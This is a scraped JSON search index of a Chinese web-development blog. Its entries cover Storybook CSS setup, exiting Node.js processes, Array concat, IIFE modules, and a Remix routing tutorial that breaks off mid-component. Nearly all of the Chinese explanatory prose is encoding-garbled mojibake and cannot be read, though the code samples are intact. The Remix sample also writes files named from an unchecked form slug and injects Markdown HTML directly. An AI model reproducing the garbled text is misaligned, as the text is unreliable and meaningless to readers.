theme=\u0026#34;default\u0026#34;\u0026gt; {Story()} \u0026lt;/ThemeProvider\u0026gt; ), ];   \ræ¸²æŸ“ç»„ä»¶æ ·å¼ Storybook å¯¹å¦‚ä½•ç”Ÿæˆæˆ–åŠ è½½ CSS å¹¶ä¸æŠ±æœ‰åè§ã€‚ å®ƒå‘ˆç°æ‚¨æä¾›çš„ä»»ä½• DOM å…ƒç´ ã€‚ ä½†æœ‰æ—¶ï¼Œå¼€ç®±å³ç”¨çš„ä¸œè¥¿ä¸ä¼šâ€œçœ‹èµ·æ¥æ­£ç¡®â€ã€‚\nå¯èƒ½éœ€è¦ä¸º Storybook çš„æ¸²æŸ“ç¯å¢ƒé…ç½® CSS å·¥å…·ã€‚ ä»¥ä¸‹æ˜¯ä¸€äº›å¯ä»¥æä¾›å¸®åŠ©çš„æç¤ºï¼š\n CSS-in-JS like styled-components and Emotion   å¦‚æœæ­£åœ¨ä½¿ç”¨ CSS-in-JSï¼Œé‚£ä¹ˆæ ·å¼å¾ˆå¯èƒ½æ˜¯æœ‰æ•ˆçš„ï¼Œå› ä¸ºå®ƒä»¬æ˜¯åœ¨ JavaScript ä¸­ç”Ÿæˆå¹¶ä¸æ¯ä¸ªç»„ä»¶ä¸€èµ·æä¾›çš„ã€‚ ä¸»é¢˜ç”¨æˆ·å¯èƒ½éœ€è¦åœ¨ .storybook/preview.js ä¸­æ·»åŠ  decoratorsï¼ˆè£…é¥°å™¨ï¼‰\n  @import CSS into components   Storybook å…è®¸ç›´æ¥åœ¨ç»„ä»¶ä¸­å¯¼å…¥ CSS æ–‡ä»¶ã€‚ ä½†åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¯èƒ½éœ€è¦è°ƒæ•´å…¶ webpack é…ç½®ã€‚\n  Global imported styles   å¦‚æœæœ‰å…¨å±€å¯¼å…¥çš„æ ·å¼ï¼Œè¯·åˆ›å»ºä¸€ä¸ªåä¸º .storybook/preview.js çš„æ–‡ä»¶å¹¶åœ¨é‚£é‡Œå¯¼å…¥æ ·å¼ã€‚ Storybook ä¼šè‡ªåŠ¨ä¸ºæ‰€æœ‰æ•…äº‹æ·»åŠ å®ƒä»¬ã€‚\n  Add external CSS or webfonts in the \u0026lt;head\u0026gt;   æˆ–è€…ï¼Œå¦‚æœæƒ³ç›´æ¥å°† CSS é“¾æ¥æ ‡è®°æ³¨å…¥ \u0026lt;head\u0026gt;ï¼ˆæˆ–å…¶ä»–ä¸€äº›èµ„æºï¼Œå¦‚ webfont é“¾æ¥ï¼‰ï¼Œå¯ä»¥ä½¿ç”¨ .storybook/preview-head.html æ·»åŠ ä»»æ„ HTMLã€‚\n  ä»æœ¬åœ°ç›®å½•åŠ è½½å­—ä½“æˆ–å›¾åƒ   å¦‚æœä»æœ¬åœ°ç›®å½•å¼•ç”¨å­—ä½“æˆ–å›¾åƒï¼Œåˆ™éœ€è¦é…ç½® Storybook è„šæœ¬ä»¥æä¾›é™æ€æ–‡ä»¶ã€‚\n \råŠ è½½èµ„äº§å’Œèµ„æº å¦‚æœè¦é“¾æ¥åˆ°é¡¹ç›®æˆ–æ•…äº‹ä¸­çš„é™æ€æ–‡ä»¶ï¼ˆä¾‹å¦‚ï¼Œ/fonts/XYZ.woffï¼‰ï¼Œè¯·ä½¿ç”¨ -s path/to/folder æ ‡å¿—æŒ‡å®šä¸€ä¸ªé™æ€æ–‡ä»¶å¤¹ï¼Œä»¥ä¾¿åœ¨å¯åŠ¨ Storybook æ—¶æä¾›æœåŠ¡ã€‚ ä¸ºæ­¤ï¼Œè¯·ç¼–è¾‘ package.json ä¸­çš„ storybook å’Œ build-storybook è„šæœ¬ã€‚\nå»ºè®®ä½¿ç”¨ Storybook é™æ€æä¾›ç»„ä»¶ä¸­è¯·æ±‚çš„å¤–éƒ¨èµ„æºå’Œèµ„äº§ã€‚ å®ƒç¡®ä¿èµ„äº§å§‹ç»ˆå¯ç”¨äºæ‚¨çš„æ•…äº‹ã€‚\n","description":"","id":82,"section":"react","tags":null,"title":"è®¾ç½®","uri":"https://codthing.github.io/react/storybook/sb-started/sb-setup/"},{"content":"æœ‰å¤šç§æ–¹æ³•å¯ä»¥ç»ˆæ­¢ Node.js åº”ç”¨ç¨‹åºã€‚\n1. ctrl + c åœ¨æ§åˆ¶å°ä¸­è¿è¡Œç¨‹åºæ—¶ï¼Œå¯ä»¥ä½¿ç”¨ ctrl-C å…³é—­å®ƒï¼Œä½†åœ¨è¿™é‡Œè¦è®¨è®ºçš„æ˜¯ä»¥ç¼–ç¨‹æ–¹å¼é€€å‡ºã€‚\n2. process.exit() process æ ¸å¿ƒæ¨¡å—æä¾›äº†ä¸€ä¸ªæ–¹ä¾¿çš„æ–¹æ³•ï¼Œå…è®¸ä»¥ç¼–ç¨‹æ–¹å¼é€€å‡º Node.js ç¨‹åºï¼šprocess.exit()ã€‚\nå½“ Node.js è¿è¡Œè¿™ä¸€è¡Œæ—¶ï¼Œè¿›ç¨‹ä¼šç«‹å³è¢«å¼ºåˆ¶ç»ˆæ­¢ã€‚\n1 2  process.exit(1)   é»˜è®¤é€€å‡ºä»£ç ä¸º 0ï¼Œè¡¨ç¤ºæˆåŠŸã€‚\nä¸åŒçš„é€€å‡ºä»£ç å…·æœ‰ä¸åŒçš„å«ä¹‰ï¼Œå¯èƒ½å¸Œæœ›åœ¨è‡ªå·±çš„ç³»ç»Ÿä¸­ä½¿ç”¨å®ƒæ¥è®©ç¨‹åºä¸å…¶ä»–ç¨‹åºé€šä¿¡ã€‚\nè¿˜å¯ä»¥è®¾ç½® process.exitCode å±æ€§ï¼š\n1 2  process.exitCode = 1   å½“ç¨‹åºç»“æŸæ—¶ï¼ŒNode.js å°†è¿”å›è¯¥é€€å‡ºä»£ç ã€‚\nå½“æ‰€æœ‰å¤„ç†å®Œæˆåï¼Œç¨‹åºå°†ä¼˜é›…åœ°é€€å‡ºã€‚\nå¾ˆå¤šæ—¶å€™ä½¿ç”¨ Node.js å¯åŠ¨æœåŠ¡å™¨ï¼Œæ¯”å¦‚è¿™ä¸ª HTTP æœåŠ¡å™¨ï¼š\n1 2 3 4 5 6 7 8 9  const express = require(\u0026#39;express\u0026#39;) const app = express() app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { res.send(\u0026#39;Hi!\u0026#39;) }) app.listen(3000, () =\u0026gt; console.log(\u0026#39;Server ready\u0026#39;))   è¿™ä¸ªç¨‹åºæ°¸è¿œä¸ä¼šç»“æŸã€‚ å¦‚æœè°ƒç”¨ process.exit()ï¼Œä»»ä½•å½“å‰æŒ‚èµ·æˆ–æ­£åœ¨è¿è¡Œçš„è¯·æ±‚éƒ½å°†è¢«ä¸­æ­¢ã€‚ è¿™ä¸å¥½ã€‚\n3. è¿›ç¨‹ä¿¡å·å¤„ç†ç¨‹åº åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œéœ€è¦å‘å‘½ä»¤å‘é€ä¸€ä¸ª SIGTERM ä¿¡å·ï¼Œå¹¶ä½¿ç”¨è¿›ç¨‹ä¿¡å·å¤„ç†ç¨‹åºå¤„ç†å®ƒï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  const express = require(\u0026#39;express\u0026#39;) const app = express() app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { res.send(\u0026#39;Hi!\u0026#39;) }) const server = app.listen(3000, () =\u0026gt; console.log(\u0026#39;Server ready\u0026#39;)) process.on(\u0026#39;SIGTERM\u0026#39;, () =\u0026gt; { server.close(() =\u0026gt; { console.log(\u0026#39;Process terminated\u0026#39;) }) })   SIGKILL æ˜¯å‘Šè¯‰è¿›ç¨‹ç«‹å³ç»ˆæ­¢çš„ä¿¡å·ï¼Œç†æƒ³æƒ…å†µä¸‹å°±åƒ process.exit() ä¸€æ ·ã€‚\nSIGTERM æ˜¯å‘Šè¯‰è¿›ç¨‹æ­£å¸¸ç»ˆæ­¢çš„ä¿¡å·ã€‚ è¿™æ˜¯ä»åƒ upstart æˆ– supervisord ç­‰è®¸å¤šå…¶ä»–æµç¨‹ç®¡ç†äººå‘˜å‘é€çš„ä¿¡å·ã€‚\nå¯ä»¥ä»ç¨‹åºå†…éƒ¨çš„å¦ä¸€ä¸ªå‡½æ•°ä¸­å‘é€æ­¤ä¿¡å·(æˆ–è€…æ¥è‡ªå¦ä¸€ä¸ªè¿è¡Œ Node.js çš„ç¨‹åºï¼Œæˆ–è€…åœ¨ç³»ç»Ÿä¸­è¿è¡Œçš„ä»»ä½•å…¶ä»–çŸ¥é“æ‚¨è¦ç»ˆæ­¢çš„è¿›ç¨‹çš„ PID çš„åº”ç”¨ç¨‹åº)ï¼š\n1 2  process.kill(process.pid, \u0026#39;SIGTERM\u0026#39;)   ","description":"","id":83,"section":"nodejs","tags":null,"title":"é€€å‡º Node.js ç¨‹åº","uri":"https://codthing.github.io/nodejs/nodebase/node-exit/"},{"content":"concat() æ–¹æ³•ç”¨äºåˆå¹¶ä¸¤ä¸ªæˆ–å¤šä¸ªæ•°ç»„ã€‚ æ­¤æ–¹æ³•ä¸ä¼šæ›´æ”¹ç°æœ‰æ•°ç»„ï¼Œè€Œæ˜¯è¿”å›ä¸€ä¸ªæ–°æ•°ç»„ã€‚\nä½¿ç”¨ concat æ–¹æ³•ç»„åˆä¸¤ä¸ªæ•°ç»„ Concatenation æ„æ€æ˜¯å°†å…ƒç´ è¿æ¥åˆ°å°¾éƒ¨ã€‚\nåŒç†ï¼ŒJavaScript ä¸ºå­—ç¬¦ä¸²å’Œæ•°ç»„æä¾›äº†concatï¼ˆArray.prototype.concat()ï¼‰æ–¹æ³•ã€‚\nå¯¹æ•°ç»„æ¥è¯´ï¼Œåœ¨ä¸€ä¸ªæ•°ç»„ä¸Šè°ƒç”¨ concat æ–¹æ³•ï¼Œç„¶åæä¾›å¦ä¸€ä¸ªæ•°ç»„ä½œä¸ºå‚æ•°æ·»åŠ åˆ°ç¬¬ä¸€ä¸ªæ•°ç»„æœ«å°¾ã€‚ å®ƒè¿”å›ä¸€ä¸ªæ–°æ•°ç»„ï¼Œä¸ä¼šæ”¹å˜ä»»ä½•ä¸€ä¸ªåŸå§‹æ•°ç»„ã€‚\nç®€å•çš„ä¾‹å­ï¼š\n1  [1, 2, 3].concat([4, 5, 6]); // [1, 2, 3, 4, 5, 6]   å¤æ‚çš„ä¾‹å­ï¼š\n1 2 3 4 5 6 7 8 9  function nonMutatingConcat(original, attach) { return original.concat(attach) } const first = [1, 2, 3]; const second = [4, 5]; nonMutatingConcat(first, second); // [1, 2, 3, 4, 5]   \rä½¿ç”¨ concat è€Œä¸æ˜¯ push å°†å…ƒç´ æ·»åŠ åˆ°æ•°ç»„çš„æœ«å°¾ å‡½æ•°å¼ç¼–ç¨‹å°±æ˜¯åˆ›å»ºå’Œä½¿ç”¨å…·æœ‰ä¸å˜æ€§çš„å‡½æ•°ã€‚\nconcat æ–¹æ³•ï¼Œæ˜¯ä¸€ç§åœ¨ä¸æ”¹å˜åŸå§‹æ•°ç»„çš„å‰æä¸‹ï¼Œå°†æ•°ç»„ç»„åˆæˆæ–°æ•°ç»„çš„æ–¹æ³•ã€‚\nå°† concat æ–¹æ³•ä¸ push æ–¹æ³•åšæ¯”è¾ƒã€‚\npush å°†å…ƒç´ æ·»åŠ åˆ°è°ƒç”¨å®ƒçš„æ•°ç»„çš„æœ«å°¾ï¼Œè¿™æ ·ä¼šæ”¹å˜è¯¥æ•°ç»„ã€‚\n1 2 3  const arr = [1, 2, 3]; arr.push([4, 5, 6]); console.log(arr); // [1, 2, 3, [4, 5, 6]]   concat æ–¹æ³•å¯ä»¥å°†æ–°é¡¹ç›®æ·»åŠ åˆ°æ•°ç»„æœ«å°¾ï¼Œè€Œä¸äº§ç”Ÿå‰¯ä½œç”¨\n1 2 3 4 5 6 7 8 9  function nonMutatingPush(original, newItem) { return original.concat(newItem); } const first = [1, 2, 3]; const second = [4, 5]; nonMutatingPush(first, second); // [1, 2, 3, 4, 5]   ","description":"concat() æ–¹æ³•ç”¨äºåˆå¹¶ä¸¤ä¸ªæˆ–å¤šä¸ªæ•°ç»„ã€‚ æ­¤æ–¹æ³•ä¸ä¼šæ›´æ”¹ç°æœ‰æ•°ç»„ï¼Œè€Œæ˜¯è¿”å›ä¸€ä¸ªæ–°æ•°ç»„ã€‚","id":84,"section":"javascript","tags":null,"title":"Array.prototype.concat()","uri":"https://codthing.github.io/javascript/algorithms-data/function-programming/concat-programming/"},{"content":"ä¸€ã€äº†è§£ç«‹å³è°ƒç”¨å‡½æ•°è¡¨è¾¾ï¼ˆIIFEï¼‰ JavaScript ä¸­çš„ä¸€ä¸ªå¸¸è§æ¨¡å¼å°±æ˜¯ï¼Œå‡½æ•°åœ¨å£°æ˜åç«‹åˆ»æ‰§è¡Œï¼š\n1 2 3 4  (function () { console.log(\u0026#34;Chirp, chirp!\u0026#34;); })();   è¿™æ˜¯ä¸€ä¸ªåŒ¿åå‡½æ•°è¡¨è¾¾å¼ï¼Œç«‹å³æ‰§è¡Œå¹¶è¾“å‡º Chirp, chirp!ã€‚\nè¯·æ³¨æ„ï¼Œå‡½æ•°æ²¡æœ‰åç§°ï¼Œä¹Ÿä¸å­˜å‚¨åœ¨å˜é‡ä¸­ã€‚\nå‡½æ•°è¡¨è¾¾å¼æœ«å°¾çš„ä¸¤ä¸ªæ‹¬å·ï¼ˆï¼‰ä¼šè®©å®ƒè¢«ç«‹å³æ‰§è¡Œæˆ–è°ƒç”¨ã€‚\nè¿™ç§æ¨¡å¼è¢«å«åšç«‹å³è°ƒç”¨å‡½æ•°è¡¨è¾¾å¼ï¼ˆimmediately invoked function expression) æˆ–è€…IIFEã€‚\n\räºŒã€ä½¿ç”¨ IIFE åˆ›å»ºä¸€ä¸ªæ¨¡å— ä¸€ä¸ªç«‹å³è°ƒç”¨å‡½æ•°è¡¨è¾¾å¼ï¼ˆIIFEï¼‰é€šå¸¸ç”¨äºå°†ç›¸å…³åŠŸèƒ½åˆ†ç»„åˆ°å•ä¸ªå¯¹è±¡æˆ–è€…æ˜¯ module ä¸­\n1 2 3 4 5 6 7 8 9 10 11  function glideMixin(obj) { obj.glide = function() { console.log(\u0026#34;Gliding on the water\u0026#34;); }; } function flyMixin(obj) { obj.fly = function() { console.log(\u0026#34;Flying, wooosh!\u0026#34;); }; }   å¯ä»¥å°†è¿™äº› mixins åˆ†æˆä»¥ä¸‹æ¨¡å—ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  let motionModule = (function () { return { glideMixin: function(obj) { obj.glide = function() { console.log(\u0026#34;Gliding on the water\u0026#34;); }; }, flyMixin: function(obj) { obj.fly = function() { console.log(\u0026#34;Flying, wooosh!\u0026#34;); }; } } })();   æ³¨æ„ï¼š ä¸€ä¸ªç«‹å³è°ƒç”¨å‡½æ•°è¡¨è¾¾å¼ï¼ˆIIFEï¼‰è¿”å›äº†ä¸€ä¸ª motionModule å¯¹è±¡ã€‚\nè¿”å›çš„è¿™ä¸ªå¯¹è±¡åŒ…å«äº†ä½œä¸ºå¯¹è±¡å±æ€§çš„æ‰€æœ‰ mixin è¡Œä¸ºã€‚\nmodule æ¨¡å¼çš„ä¼˜ç‚¹æ˜¯ï¼Œæ‰€æœ‰çš„è¿åŠ¨ç›¸å…³çš„è¡Œä¸ºéƒ½å¯ä»¥æ‰“åŒ…æˆä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åç”±ä»£ç çš„å…¶ä»–éƒ¨åˆ†ä½¿ç”¨ã€‚\nä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨å®ƒçš„ä¾‹å­ï¼š\n1 2 3 4 5 6 7 8  let duck = { name: \u0026#34;Donald\u0026#34;, numLegs: 2 }; motionModule.glideMixin(duck); duck.glide(); // Gliding on the water   ","description":"ç«‹å³è°ƒç”¨å‡½æ•°è¡¨è¾¾å¼ï¼Œå‡½æ•°åœ¨å£°æ˜åç«‹åˆ»æ‰§è¡Œ","id":85,"section":"javascript","tags":null,"title":"IIFE","uri":"https://codthing.github.io/javascript/algorithms-data/object-programming/iife/"},{"content":"ä¸€ã€åˆ›å»º Remix åº”ç”¨ npx create-remix@latest\ryarn dev äºŒã€åˆ›å»ºæ–‡ä»¶è·¯ç”±  app/root.tsx Layout ç»„ä»¶ä¸­\n \u0026lt;li\u0026gt;\r\u0026lt;Link to=\u0026#34;/posts\u0026#34;\u0026gt;Posts\u0026lt;/Link\u0026gt;\r\u0026lt;/li\u0026gt;  åˆ›å»º app/routes/posts/index.tsx\n export default function Posts() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;Posts\u0026lt;/h1\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r} ä¸‰ã€åŠ è½½æ•°æ® Remix çš„è·¯ç”±æ–‡ä»¶ç›¸å½“äºåç«¯çš„æ¨¡æ¿è§†å›¾ï¼Œä¹Ÿæ˜¯æ§åˆ¶å™¨ï¼ŒRemix å»ºç«‹åœ¨ HTTP å’Œ HTML çš„åŸºç¡€ä¹‹ä¸Šï¼Œå› æ­¤æ•´ä¸ªè¿‡ç¨‹æ— éœ€åœ¨æµè§ˆå™¨ä¸­ä½¿ç”¨ JavaScriptã€‚è¿™ä¹Ÿæ˜¯ Remix çš„åˆ›æ–°ä¹‹å¤„ï¼Œæˆ‘ç›®å‰çš„ç†è§£æ˜¯ Remix ç±»ä¼¼ Nodejsä¸­é—´å±‚ ï¼Œåªæ˜¯ Remix å°† React æ•´åˆåˆ°äº†ä¸­é—´å±‚ä¸­ã€‚è¿™æ ·åšçš„å¥½å¤„æ˜¯å°‘äº†ä¸€å±‚ï¼Œæå‡æ€§èƒ½çš„åŒæ—¶ç®€åŒ–äº†å¼€å‘æˆæœ¬ï¼Œè®©å‰ç«¯æ›´ä¸“æ³¨äºå‰ç«¯ï¼Œåç«¯æ›´ä¸“æ³¨äºåç«¯ã€‚\nStep1. é¡¹ç›®æ ¹ç›®å½•ä¸‹ï¼ˆä¸æ˜¯appç›®å½•ï¼‰ åˆ›å»ºæœ¬åœ°æ–‡ä»¶æ¨¡æ‹Ÿæ•°æ®ï¼ˆçœŸå®é¡¹ç›®å¾€å¾€æ˜¯ä»æœåŠ¡å™¨æ•°æ®åº“è¯·æ±‚æ•°æ®ï¼‰\n posts/my-first-post.md\n ---\rtitle: My First Post\r---\r# This is my first post\rIsn\u0026#39;t it great?  posts/90s-mix-cdr.md\n ---\rtitle: 90s Mixtape\r---\r# 90s Mixtape\r- I wish (Skee-Lo)\r- This Is How We Do It (Montell Jordan)\r- Everlong (Foo Fighters)\r- Ms. Jackson (Outkast)\r- Interstate Love Song (Stone Temple Pilots)\r- Killing Me Softly With His Song (Fugees, Ms. Lauryn Hill)\r- Just a Friend (Biz Markie)\r- The Man Who Sold The World (Nirvana)\r- Semi-Charmed Life (Third Eye Blind)\r- ...Baby One More Time (Britney Spears)\r- Better Man (Pearl Jam)\r- It\u0026#39;s All Coming Back to Me Now (CÃ©line Dion)\r- This Kiss (Faith Hill)\r- Fly Away (Lenny Kravits)\r- Scar Tissue (Red Hot Chili Peppers)\r- Santa Monica (Everclear)\r- C\u0026#39;mon N\u0026#39; Ride it (Quad City DJ\u0026#39;s) Step2. åˆ›å»º app/post.ts è¿™ä¸ªæ–‡ä»¶æ˜¯å¤„ç†postsçš„æ¨¡å—ï¼Œåœ¨è¿™é‡Œæ¨¡æ‹Ÿè¯·æ±‚æ•°æ®\n é¦–å…ˆå®‰è£…ä¸¤ä¸ªæ¨¡å— fron-matter tiny-invariant\n yarn add front-matter //nodeæ¨¡å—\ryarn add tiny-invariant //ç±»å‹æ£€æŸ¥ import path from \u0026#34;path\u0026#34;;\rimport fs from \u0026#34;fs/promises\u0026#34;;\rimport parseFrontMatter from \u0026#34;front-matter\u0026#34;;\rimport invariant from \u0026#34;tiny-invariant\u0026#34;;\rexport type Post = {\rslug: string;\rtitle: string;\r};\rexport type PostMarkdownAttributes = {\rtitle: string;\r};\r// ç›¸å¯¹äºæœåŠ¡å™¨è¾“å‡ºè€Œä¸æ˜¯æºï¼\rconst postsPath = path.join(__dirname, \u0026#34;..\u0026#34;, \u0026#34;posts\u0026#34;);\rfunction isValidPostAttributes(\rattributes: any\r): attributes is PostMarkdownAttributes {\rreturn attributes?.title;\r}\rexport async function getPosts() {\rconst dir = await fs.readdir(postsPath);\rreturn Promise.all(\rdir.map(async filename =\u0026gt; {\rconst file = await fs.readFile(\rpath.join(postsPath, filename)\r);\rconst { attributes } = parseFrontMatter(\rfile.toString()\r);\rinvariant(\risValidPostAttributes(attributes),\r`${filename} æœ‰é”™è¯¯çš„å…ƒæ•°æ®ï¼`\r);\rreturn {\rslug: filename.replace(/\\.md$/, \u0026#34;\u0026#34;),\rtitle: attributes.title\r};\r})\r);\r} Step3. app/routes/posts/index.tsx\nimport { Link, useLoaderData } from \u0026#39;remix\u0026#39;;\rimport { getPosts } from \u0026#39;~/post\u0026#39;;\rimport type { Post } from \u0026#39;~/post\u0026#39;;\rexport const loader = () =\u0026gt; {\rreturn getPosts();\r};\rexport default function Posts() {\rconst posts = useLoaderData\u0026lt;Post[]\u0026gt;();\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;Posts\u0026lt;/h1\u0026gt;\r\u0026lt;ul\u0026gt;\r{posts.map(post =\u0026gt; (\r\u0026lt;li key={post.slug}\u0026gt;\r\u0026lt;Link to={post.slug}\u0026gt;{post.title}\u0026lt;/Link\u0026gt;\r\u0026lt;/li\u0026gt;\r))}\r\u0026lt;/ul\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}; å››ã€åŠ¨æ€è·¯ç”± Step1. é¦–å…ˆå®‰è£… @types/marked å°† markdown è§£æä¸º HTML\nyarn add marked\ryarn add @types/marked Step2. ä¸º app/post.ts æ¨¡å—æ·»åŠ ä¸€ä¸ªå‡½æ•° getPost\nimport path from \u0026#34;path\u0026#34;;\rimport fs from \u0026#34;fs/promises\u0026#34;;\rimport parseFrontMatter from \u0026#34;front-matter\u0026#34;;\rimport invariant from \u0026#34;tiny-invariant\u0026#34;;\rimport { marked } from \u0026#39;marked\u0026#39;;\rexport type Post = {\rslug: string;\rtitle: string;\r};\rexport type PostMarkdownAttributes = {\rtitle: string;\r};\r// ç›¸å¯¹äºæœåŠ¡å™¨è¾“å‡ºè€Œä¸æ˜¯æºï¼\rconst postsPath = path.join(__dirname, \u0026#34;..\u0026#34;, \u0026#34;posts\u0026#34;);\rfunction isValidPostAttributes(\rattributes: any\r): attributes is PostMarkdownAttributes {\rreturn attributes?.title;\r};\rexport async function getPosts() {\rconst dir = await fs.readdir(postsPath);\rreturn Promise.all(\rdir.map(async filename =\u0026gt; {\rconst file = await fs.readFile(\rpath.join(postsPath, filename)\r);\rconst { attributes } = parseFrontMatter(\rfile.toString()\r);\rinvariant(\risValidPostAttributes(attributes),\r`${filename} æœ‰é”™è¯¯çš„å…ƒæ•°æ®ï¼`\r);\rreturn {\rslug: filename.replace(/\\.md$/, \u0026#34;\u0026#34;),\rtitle: attributes.title\r};\r})\r);\r};\rexport async function getPost(slug: string) {\rconst filepath = path.join(postsPath, slug + \u0026#34;.md\u0026#34;);\rconst file = await fs.readFile(filepath);\rconst { attributes, body } = parseFrontMatter(\rfile.toString()\r);\rinvariant(\risValidPostAttributes(attributes),\r`Post ${filepath} is missing attributes`\r);\rconst html = marked(body);\rreturn { slug, html, title: attributes.title };\r} Step3. åˆ›å»ºåŠ¨æ€è·¯ç”±æ–‡ä»¶\n app/routes/posts/$slug.tsx\n import { useLoaderData } from \u0026#39;remix\u0026#39;;\rimport type { LoaderFunction } from \u0026#39;remix\u0026#39;;\rimport { getPost } from \u0026#34;~/post\u0026#34;;\rimport invariant from \u0026#34;tiny-invariant\u0026#34;;\rexport const loader: LoaderFunction = async ({ params }) =\u0026gt; {\rinvariant(params.slug, \u0026#34;expected params.slug\u0026#34;);\rreturn getPost(params.slug);\r};\rexport default function PostSlug() {\rconst post = useLoaderData();\rreturn (\r\u0026lt;div dangerouslySetInnerHTML={{ __html: post.html }} /\u0026gt;\r);\r}; äº”ã€å­è·¯ç”±ï¼ˆåµŒå¥—è·¯ç”±ï¼‰ Step1. åˆ›å»ºä¸€ä¸ª admin è·¯ç”±æ–‡ä»¶\n app/routes/admin.tsx æ³¨æ„ä½¿ç”¨ï¼šOutlet\n import { Outlet, Link, useLoaderData } from \u0026#34;remix\u0026#34;;\rimport { getPosts } from \u0026#34;~/post\u0026#34;;\rimport type { Post } from \u0026#34;~/post\u0026#34;;\rimport adminStyles from \u0026#34;~/styles/admin.css\u0026#34;;\rexport const links = () =\u0026gt; {\rreturn [{ rel: \u0026#34;stylesheet\u0026#34;, href: adminStyles }];\r};\rexport const loader = () =\u0026gt; {\rreturn getPosts();\r};\rexport default function Admin() {\rconst posts = useLoaderData\u0026lt;Post[]\u0026gt;();\rreturn (\r\u0026lt;div className=\u0026#34;admin\u0026#34;\u0026gt;\r\u0026lt;nav\u0026gt;\r\u0026lt;h1\u0026gt;Admin\u0026lt;/h1\u0026gt;\r\u0026lt;ul\u0026gt;\r{posts.map(post =\u0026gt; (\r\u0026lt;li key={post.slug}\u0026gt;\r\u0026lt;Link to={`/posts/${post.slug}`}\u0026gt;\r{post.title}\r\u0026lt;/Link\u0026gt;\r\u0026lt;/li\u0026gt;\r))}\r\u0026lt;/ul\u0026gt;\r\u0026lt;/nav\u0026gt;\r\u0026lt;main\u0026gt;\r\u0026lt;Outlet/\u0026gt;\r\u0026lt;/main\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r};  app/styles/admin.css\n .admin {\rdisplay: flex;\r}\r.admin \u0026gt; nav {\rpadding-right: 2rem;\r}\r.admin \u0026gt; main {\rflex: 1;\rborder-left: solid 1px #ccc;\rpadding-left: 2rem;\r}\rem {\rcolor: red;\r} Step2. ä¸º admin.tsx åˆ›å»ºå­è·¯ç”±æ–‡ä»¶å¤¹\n app/routes/admin/index.tsx\n import { Link } from \u0026#34;remix\u0026#34;;\rexport default function AdminIndex() {\rreturn (\r\u0026lt;p\u0026gt;\r\u0026lt;Link to=\u0026#34;new\u0026#34;\u0026gt;Create a New Post\u0026lt;/Link\u0026gt;\r\u0026lt;/p\u0026gt;\r);\r} Step3. åœ¨ app/post.ts å¤„ç†æ–°å»ºPostçš„é€»è¾‘\nimport path from \u0026#34;path\u0026#34;;\rimport fs from \u0026#34;fs/promises\u0026#34;;\rimport parseFrontMatter from \u0026#34;front-matter\u0026#34;;\rimport invariant from \u0026#34;tiny-invariant\u0026#34;;\rimport { marked } from \u0026#39;marked\u0026#39;;\rexport type Post = {\rslug: string;\rtitle: string;\r};\rexport type PostMarkdownAttributes = {\rtitle: string;\r};\rtype NewPost = {\rtitle: string;\rslug: string;\rmarkdown: string;\r};\r// ç›¸å¯¹äºæœåŠ¡å™¨è¾“å‡ºè€Œä¸æ˜¯æºï¼\rconst postsPath = path.join(__dirname, \u0026#34;..\u0026#34;, \u0026#34;posts\u0026#34;);\rfunction isValidPostAttributes(\rattributes: any\r): attributes is PostMarkdownAttributes {\rreturn attributes?.title;\r};\r//Poståˆ—è¡¨\rexport async function getPosts() {\rconst dir = await fs.readdir(postsPath);\rreturn Promise.all(\rdir.map(async filename =\u0026gt; {\rconst file = await fs.readFile(\rpath.join(postsPath, filename)\r);\rconst { attributes } = parseFrontMatter(\rfile.toString()\r);\rinvariant(\risValidPostAttributes(attributes),\r`${filename} æœ‰é”™è¯¯çš„å…ƒæ•°æ®ï¼`\r);\rreturn {\rslug: filename.replace(/\\.md$/, \u0026#34;\u0026#34;),\rtitle: attributes.title\r};\r})\r);\r};\r// Postè¯¦æƒ…\rexport async function getPost(slug: string) {\rconst filepath = path.join(postsPath, slug + \u0026#34;.md\u0026#34;);\rconst file = await fs.readFile(filepath);\rconst { attributes, body } = parseFrontMatter(\rfile.toString()\r);\rinvariant(\risValidPostAttributes(attributes),\r`Post ${filepath} is missing attributes`\r);\rconst html = marked(body);\rreturn { slug, html, title: attributes.title };\r};\r// æ–°å»ºPost\rexport async function createPost(post: NewPost) {\rconst md = `---\\ntitle: ${post.title}\\n---\\n\\n${post.markdown}`;\rawait fs.writeFile(\rpath.join(postsPath, post.slug + \u0026#34;.md\u0026#34;),\rmd\r);\rreturn getPost(post.slug);\r}; Step4. åˆ›å»º app/routes/admin/new.tsx\nimport { useTransition, useActionData, Form, redirect } from \u0026#34;remix\u0026#34;;\rimport type { ActionFunction } from \u0026#34;remix\u0026#34;;\rimport { createPost } from \u0026#34;~/post\u0026#34;;\rimport invariant from \u0026#34;tiny-invariant\u0026#34;;\rtype PostError = {\rtitle?: boolean;\rslug?: boolean;\rmarkdown?: boolean;\r};\rexport const action: ActionFunction = async ({\rrequest\r}) =\u0026gt; {\rawait new Promise(res =\u0026gt; setTimeout(res, 1000));\rconst formData = await request.formData();\rconst title = formData.get(\u0026#34;title\u0026#34;);\rconst slug = formData.get(\u0026#34;slug\u0026#34;);\rconst markdown = formData.get(\u0026#34;markdown\u0026#34;);\rconst errors: PostError = {};\rif (!title) errors.title = true;\rif (!slug) errors.slug = true;\rif (!markdown) errors.markdown = true;\rif (Object.keys(errors).length) {\rreturn errors;\r}\rinvariant(typeof title === \u0026#34;string\u0026#34;);\rinvariant(typeof slug === \u0026#34;string\u0026#34;);\rinvariant(typeof markdown === \u0026#34;string\u0026#34;);\rawait createPost({ title, slug, markdown });\rreturn redirect(\u0026#34;/admin\u0026#34;);\r};\rexport default function NewPost() {\rconst errors = useActionData();\rconst transition = useTransition();\rreturn (\r\u0026lt;Form 